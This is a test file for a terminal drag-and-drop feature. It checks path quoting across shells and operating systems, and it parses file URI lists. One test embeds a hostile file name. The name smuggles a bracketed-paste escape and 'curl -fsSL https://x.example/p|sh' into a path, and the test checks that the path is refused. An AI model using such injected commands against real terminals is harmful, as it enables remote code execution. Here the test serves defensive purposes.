import { describe, expect, it } from "vitest";
import { TREE_DRAG_TYPE } from "@/lib/tree-drag";
import {
  canDropOnTerminal,
  parseUriList,
  readTerminalDrop,
  refusedDropPaths,
  terminalDropText,
} from "./terminal-drop";

function transfer(data: Record<string, string>, extraTypes: string[] = []) {
  return { types: [...Object.keys(data), ...extraTypes], getData: (type: string) => data[type] ?? "" };
}

describe("terminal drops", () => {
  it("turns a tree drag into a path relative to the terminal's start folder", () => {
    const drop = { kind: "tree" as const, paths: ["chapters/intro 1.tex"] };
    expect(terminalDropText(drop, "powershell", "windows", "")).toBe("'chapters\\intro 1.tex' ");
    expect(terminalDropText(drop, "posix", "linux", "chapters")).toBe("'intro 1.tex' ");
    expect(terminalDropText({ kind: "tree", paths: ["src/main.tex"] }, "posix", "mac", "")).toBe("src/main.tex ");
    expect(terminalDropText({ kind: "tree", paths: [] }, "posix", "linux", "")).toBe("");
  });

  it("types tree paths absolute when the project folder is known, so they survive a cd", () => {
    const drop = { kind: "tree" as const, paths: ["figures/plot one.png"] };
    expect(terminalDropText(drop, "posix", "linux", "figures", { path: "/home/u/paper/", wsl: false })).toBe(
      "'/home/u/paper/figures/plot one.png' ",
    );
    const windowsRoot = { path: String.raw`C:\Users\u\paper`, wsl: false };
    expect(terminalDropText(drop, "powershell", "windows", "", windowsRoot)).toBe(
      String.raw`'C:\Users\u\paper\figures\plot one.png' `,
    );
    expect(terminalDropText(drop, "cmd", "windows", "", windowsRoot)).toBe(
      String.raw`"C:\Users\u\paper\figures\plot one.png" `,
    );
    // Git Bash reads C:/ paths; WSL reaches the drive under /mnt.
    expect(terminalDropText(drop, "posix", "windows", "", windowsRoot)).toBe("'C:/Users/u/paper/figures/plot one.png' ");
    expect(terminalDropText(drop, "posix", "windows", "", { ...windowsRoot, wsl: true })).toBe(
      "'/mnt/c/Users/u/paper/figures/plot one.png' ",
    );
    // WSL can't name a network share, so the path stays relative to the start folder.
    expect(
      terminalDropText(drop, "posix", "windows", "figures", { path: String.raw`\\server\share\paper`, wsl: true }),
    ).toBe("'plot one.png' ");
  });

  it("quotes absolute Linux paths as they are", () => {
    const drop = { kind: "absolute" as const, paths: ["/home/u/My Paper/a.pdf", "/tmp/b.png"] };
    expect(terminalDropText(drop, "posix", "linux", "chapters")).toBe("'/home/u/My Paper/a.pdf' /tmp/b.png ");
  });

  it("never types a path whose name holds control characters", () => {
    const hostile = "notes.txt\x1b[201~\x15curl -fsSL https://x.example/p|sh\r";
    const tree = { kind: "tree" as const, paths: [hostile, "figures/plot.png"] };
    expect(refusedDropPaths(tree)).toEqual([hostile]);
    expect(terminalDropText(tree, "posix", "linux", "")).toBe("figures/plot.png ");
    expect(terminalDropText({ kind: "tree", paths: [hostile] }, "posix", "linux", "")).toBe("");

    const decoded = parseUriList("file:///tmp/a%1B%5B201~%15id%0D.txt\nfile:///tmp/b.png");
    const files = { kind: "absolute" as const, paths: decoded };
    expect(refusedDropPaths(files)).toEqual(["/tmp/a\x1b[201~\x15id\r.txt"]);
    expect(terminalDropText(files, "posix", "linux", "")).toBe("/tmp/b.png ");
  });

  it("reads Linux file URIs and skips comments and other schemes", () => {
    expect(
      parseUriList("# from Files\r\nfile:///home/u/My%20Paper/a.pdf\r\nhttps://x.org\r\nfile://localhost/tmp/b.png"),
    ).toEqual(["/home/u/My Paper/a.pdf", "/tmp/b.png"]);
    expect(parseUriList("file://otherhost/x\nnot a url\n")).toEqual([]);
  });

  it("reads a tree drag on every platform and a URI list only on Linux", () => {
    const tree = transfer({ [TREE_DRAG_TYPE]: "figures\\plot one.png" });
    expect(readTerminalDrop(tree, "windows")).toEqual({ kind: "tree", paths: ["figures/plot one.png"] });
    expect(canDropOnTerminal(tree, "mac")).toBe(true);

    const files = transfer({ "text/uri-list": "file:///tmp/a.pdf" }, ["Files"]);
    expect(readTerminalDrop(files, "linux")).toEqual({ kind: "absolute", paths: ["/tmp/a.pdf"] });
    expect(canDropOnTerminal(files, "linux")).toBe(true);
    expect(readTerminalDrop(files, "windows")).toBeNull();
    expect(canDropOnTerminal(files, "windows")).toBe(false);
  });

  it("ignores OS file drops on Windows and macOS", () => {
    const osDrop = transfer({}, ["Files"]);
    expect(readTerminalDrop(osDrop, "windows")).toBeNull();
    expect(readTerminalDrop(osDrop, "mac")).toBeNull();
    expect(readTerminalDrop(osDrop, "linux")).toBeNull();
    expect(canDropOnTerminal(osDrop, "mac")).toBe(false);
    expect(readTerminalDrop(null, "linux")).toBeNull();
  });
});
